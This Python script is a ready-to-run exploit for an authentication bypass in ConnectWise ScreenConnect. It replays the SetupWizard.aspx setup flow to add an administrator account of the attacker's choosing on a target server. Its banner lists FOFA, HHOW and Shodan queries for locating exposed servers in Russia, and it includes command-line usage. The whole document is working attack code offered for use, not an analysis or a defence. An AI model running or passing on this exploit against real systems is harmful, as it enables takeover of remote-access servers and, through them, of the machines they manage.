import requests
import re
import argparse
from colorama import Fore, Style

banner = f"""
{Fore.RED}
Auth Bypass in ConnectWise ScreenConnect
{Style.RESET_ALL}
{Fore.GREEN}
- FOFA: "ScreenConnect" && country="RU" 
- HHOW: web.body="ScreenConnect" and ip.country=="Russia"
- Shodan: ScreenConnect country:"RU"
{Style.RESET_ALL}
"""

helptext =  f"""
{Fore.YELLOW}Usage:
python3 bypass.py --url http://IP --username USER --password PASS
{Style.RESET_ALL}
"""

parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--url", help="target url in the format http://IP", default=False, action="store", required=True)
parser.add_argument("--username", help="username to add", required=False, action="store")
parser.add_argument("--password", help="password to add (must be at least 8 characters in length)", required=False, action="store")
try:
    args = parser.parse_args()
except:
    print(banner)
    print(helptext)
    raise

print(banner)


requests.urllib3.disable_warnings()

print(f"{Fore.CYAN} 🖥️  Target:{Style.RESET_ALL} {args.url} ")
print(f"{Fore.CYAN} 👤 Username:{Style.RESET_ALL} {args.username} ")
print(f"{Fore.CYAN} 🔑 Password:{Style.RESET_ALL} {args.password} ")

try:
    initial_request = requests.get(url=args.url+"/SetupWizard.aspx/", verify=False)
    initial_request.raise_for_status()  # Raises an HTTPError for bad status codes
except requests.exceptions.RequestException as e:
    print(f"\n{Fore.RED} ❌ Unable to connect to the target server: {e}{Style.RESET_ALL}")
    exit()

viewstate_1 = re.search(r'value="([^"]+)"', initial_request.text).group(1)
viewgen_1 = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', initial_request.text).group(1)

next_data = {"__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": viewstate_1, "__VIEWSTATEGENERATOR": viewgen_1, "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
next_request = requests.post(url=args.url+"/SetupWizard.aspx/", data=next_data, verify=False)

exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
exploit_viewgen =  re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate, "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": args.username, "ctl00$Main$wizard$emailBox": args.username+"@poc.com", "ctl00$Main$wizard$passwordBox": args.password, "ctl00$Main$wizard$verifyPasswordBox": args.password, "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}

exploit_request = requests.post(url=args.url+"/SetupWizard.aspx/", data=exploit_data, verify=False)

print(f"\n{Fore.GREEN} ✅ Successfully added user {Style.RESET_ALL}")
